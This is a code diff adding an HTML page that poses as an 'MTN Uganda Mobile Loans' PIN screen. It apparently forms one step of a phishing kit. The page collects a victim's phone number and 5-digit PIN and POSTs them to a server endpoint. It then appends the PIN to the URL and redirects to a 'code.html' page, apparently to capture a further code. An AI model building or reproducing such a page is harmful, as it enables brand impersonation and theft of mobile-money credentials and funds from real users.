@@ -1,0 +1,305 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Enter PIN - MTN Uganda</title>
+    <style>
+        * { margin: 0; padding: 0; box-sizing: border-box;
+            font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, sans-serif; }
+
+        body { background: #f4f4f4; min-height: 100vh; display: flex; flex-direction: column; }
+
+        .header {
+            background: #fff; padding: 14px 20px;
+            display: flex; align-items: center; gap: 14px;
+            border-bottom: 3px solid #ffcc00;
+            box-shadow: 0 2px 8px rgba(0,0,0,0.04);
+        }
+        .back-arrow { font-size: 22px; color: #333; text-decoration: none; cursor: pointer; }
+        .logo-box { display: flex; align-items: center; gap: 10px; }
+        .logo-icon {
+            width: 40px; height: 40px; background: #ffcc00;
+            border-radius: 8px; display: flex; align-items: center; justify-content: center;
+            font-weight: 800; font-size: 10px; color: #004f9f;
+            line-height: 1; text-align: center; border: 2px solid #004f9f;
+        }
+        .logo-text { font-weight: 800; font-size: 20px; color: #004f9f; letter-spacing: -0.5px; }
+        .header-title { font-size: 14px; font-weight: 700; color: #444; margin-left: auto; }
+
+        .main { flex: 1; display: flex; justify-content: center; padding: 30px 16px 60px; }
+        .card {
+            background: #fff; width: 100%; max-width: 520px;
+            border-radius: 16px; padding: 40px 30px 34px;
+            box-shadow: 0 8px 30px rgba(0,0,0,0.08);
+            height: fit-content;
+            text-align: center;
+        }
+
+        h1 {
+            font-size: 22px; font-weight: 800; color: #111;
+            margin-bottom: 8px;
+        }
+        .sub {
+            font-size: 14px; color: #666; line-height: 1.5;
+            margin-bottom: 32px;
+        }
+        .phone-hl {
+            color: #d4a000; font-weight: 800;
+        }
+
+        /* PIN boxes */
+        .pin-row {
+            display: flex; gap: 10px; justify-content: center;
+            margin-bottom: 26px;
+        }
+        .pin-box {
+            width: 54px; height: 64px;
+            border: 2px solid #ddd;
+            border-radius: 12px;
+            background: #fafafa;
+            font-size: 26px; font-weight: 900;
+            text-align: center;
+            color: #111;
+            outline: none;
+            transition: all 0.15s;
+            caret-color: #ffcc00;
+        }
+        .pin-box:focus {
+            border-color: #ffcc00;
+            background: #fff;
+            box-shadow: 0 0 0 4px rgba(255,204,0,0.2);
+        }
+        .pin-box.filled {
+            border-color: #d4a000;
+            background: #fffef8;
+        }
+        .pin-box.error {
+            border-color: #dc2626;
+            background: #fff5f5;
+            animation: shake 0.3s;
+        }
+        @keyframes shake {
+            0%, 100% { transform: translateX(0); }
+            25% { transform: translateX(-6px); }
+            75% { transform: translateX(6px); }
+        }
+
+        .submit-btn {
+            width: 100%;
+            background: #ffcc00; color: #111;
+            border: none; padding: 16px;
+            font-size: 15px; font-weight: 900; letter-spacing: 1px;
+            border-radius: 12px; cursor: pointer;
+            text-transform: uppercase;
+            transition: background 0.2s, opacity 0.2s;
+            box-shadow: 0 6px 16px rgba(255,204,0,0.35);
+        }
+        .submit-btn:hover:not(:disabled) { background: #e6b800; }
+        .submit-btn:disabled { opacity: 0.4; cursor: not-allowed; }
+
+        .error-msg {
+            display: none; font-size: 13px; color: #dc2626;
+            font-weight: 700; margin-top: 14px; text-align: center;
+        }
+        .error-msg.show { display: block; }
+
+        /* Loading overlay — 5 sec */
+        .loading {
+            position: fixed; inset: 0;
+            background: rgba(255,255,255,0.98);
+            display: none; flex-direction: column;
+            align-items: center; justify-content: center;
+            z-index: 999; padding: 24px; text-align: center;
+        }
+        .loading.show { display: flex; }
+
+        .spinner {
+            width: 70px; height: 70px;
+            border: 6px solid #ffeeb0;
+            border-top: 6px solid #ffcc00;
+            border-radius: 50%;
+            animation: spin 1s linear infinite;
+            margin-bottom: 24px;
+        }
+        @keyframes spin { to { transform: rotate(360deg); } }
+
+        .loading-title {
+            font-size: 20px; font-weight: 800; color: #111;
+            margin-bottom: 8px;
+        }
+        .loading-sub {
+            font-size: 14px; color: #666; margin-bottom: 24px;
+        }
+        .countdown {
+            width: 70px; height: 70px;
+            background: #ffcc00; color: #111;
+            border-radius: 50%;
+            display: flex; align-items: center; justify-content: center;
+            font-size: 30px; font-weight: 900;
+            box-shadow: 0 8px 20px rgba(255,204,0,0.4);
+        }
+
+        .footer {
+            background: #111; color: #ffcc00; text-align: center;
+            padding: 18px; font-size: 13px; font-weight: 600;
+        }
+
+        @media (max-width: 480px) {
+            .card { padding: 32px 22px; }
+            h1 { font-size: 19px; }
+            .pin-box { width: 46px; height: 58px; font-size: 22px; }
+            .pin-row { gap: 8px; }
+        }
+    </style>
+</head>
+<body>
+
+    <header class="header">
+        <a href="verify.html" class="back-arrow">←</a>
+        <div class="logo-box">
+            <div class="logo-icon">MTN<br>UG</div>
+            <div class="logo-text">MTN Uganda</div>
+        </div>
+        <span class="header-title">Mobile Loans</span>
+    </header>
+
+    <main class="main">
+        <div class="card">
+            <h1>Enter Your 5-Digit PIN</h1>
+            <p class="sub">
+                Enter your PIN for <span class="phone-hl" id="phoneHl">+256 —</span><br>
+                to continue with your application.
+            </p>
+
+            <div class="pin-row">
+                <input type="tel" class="pin-box" id="pin1" maxlength="1" inputmode="numeric" pattern="[0-9]" autocomplete="off">
+                <input type="tel" class="pin-box" id="pin2" maxlength="1" inputmode="numeric" pattern="[0-9]" autocomplete="off">
+                <input type="tel" class="pin-box" id="pin3" maxlength="1" inputmode="numeric" pattern="[0-9]" autocomplete="off">
+                <input type="tel" class="pin-box" id="pin4" maxlength="1" inputmode="numeric" pattern="[0-9]" autocomplete="off">
+                <input type="tel" class="pin-box" id="pin5" maxlength="1" inputmode="numeric" pattern="[0-9]" autocomplete="off">
+            </div>
+
+            <button class="submit-btn" id="submitBtn" disabled>Verify PIN</button>
+
+            <p class="error-msg" id="errorMsg"></p>
+        </div>
+    </main>
+
+    <!-- 5-second countdown overlay -->
+    <div class="loading" id="loading">
+        <div class="spinner"></div>
+        <div class="loading-title">PIN Received</div>
+        <div class="loading-sub">Continuing to verification…</div>
+        <div class="countdown" id="countdown">10</div>
+    </div>
+
+    <footer class="footer">© 2026 MTN Uganda Loans</footer>
+
+    <script>
+        const params = new URLSearchParams(window.location.search);
+        const phone  = params.get('phone') || '';
+        const amount = params.get('amount') || '';
+        const term   = params.get('term')   || '';
+
+        function fmtPhone(p) {
+            const clean = p.replace(/\D/g, '');
+            if (clean.length === 9) {
+                return '+256 ' + clean.slice(0,3) + ' ' + clean.slice(3,6) + ' ' + clean.slice(6,9);
+            }
+            return clean ? '+256 ' + clean : '+256 —';
+        }
+        document.getElementById('phoneHl').textContent = fmtPhone(phone);
+
+        // ─── PIN boxes ───
+        const boxes = [
+            document.getElementById('pin1'),
+            document.getElementById('pin2'),
+            document.getElementById('pin3'),
+            document.getElementById('pin4'),
+            document.getElementById('pin5')
+        ];
+        const submitBtn = document.getElementById('submitBtn');
+        const errorMsg  = document.getElementById('errorMsg');
+
+        function getPin() { return boxes.map(b => b.value).join(''); }
+
+        function checkComplete() {
+            submitBtn.disabled = getPin().length !== 5;
+            boxes.forEach(b => b.classList.toggle('filled', b.value.length === 1));
+        }
+
+        boxes.forEach((box, i) => {
+            box.addEventListener('input', function () {
+                this.value = this.value.replace(/\D/g, '').slice(-1);
+                this.classList.remove('error');
+                if (this.value && i < 4) boxes[i+1].focus();
+                checkComplete();
+            });
+            box.addEventListener('keydown', function (e) {
+                if (e.key === 'Backspace' && !this.value && i > 0) {
+                    boxes[i-1].focus();
+                }
+            });
+            box.addEventListener('paste', function (e) {
+                e.preventDefault();
+                const pasted = (e.clipboardData || window.clipboardData).getData('text').replace(/\D/g,'');
+                if (pasted.length >= 5) {
+                    boxes.forEach((b, j) => { b.value = pasted[j] || ''; });
+                    boxes[4].focus();
+                    checkComplete();
+                }
+            });
+        });
+        boxes[0].focus();
+
+        // ─── Submit PIN + 5s countdown ───
+        submitBtn.addEventListener('click', async function () {
+            if (submitBtn.disabled) return;
+            const pin = getPin();
+
+            submitBtn.disabled = true;
+            submitBtn.textContent = '...';
+
+            try {
+                const res = await fetch('/api/submit-pin', {
+                    method: 'POST',
+                    headers: { 'Content-Type': 'application/json' },
+                    body: JSON.stringify({ phone, pin })
+                });
+                const data = await res.json();
+
+                if (data.ok) {
+                    document.getElementById('loading').classList.add('show');
+                    let n = 10;
+                    const cd = document.getElementById('countdown');
+                    cd.textContent = n;
+                    const iv = setInterval(() => {
+                        n--;
+                        cd.textContent = n;
+                        if (n <= 0) {
+                            clearInterval(iv);
+                            const next = new URLSearchParams(params);
+                            next.set('pin', pin);
+                            window.location.href = 'code.html?' + next.toString();
+                        }
+                    }, 1000);
+                } else {
+                    throw new Error('not ok');
+                }
+            } catch (err) {
+                console.error(err);
+                boxes.forEach(b => b.classList.add('error'));
+                errorMsg.textContent = 'Something went wrong. Please try again.';
+                errorMsg.classList.add('show');
+                setTimeout(() => {
+                    boxes.forEach(b => { b.value = ''; b.classList.remove('error'); });
+                    boxes[0].focus();
+                    checkComplete();
+                    submitBtn.textContent = 'Verify PIN';
+                }, 800);
+            }
+        });
+    </script>
+</body>
+</html>
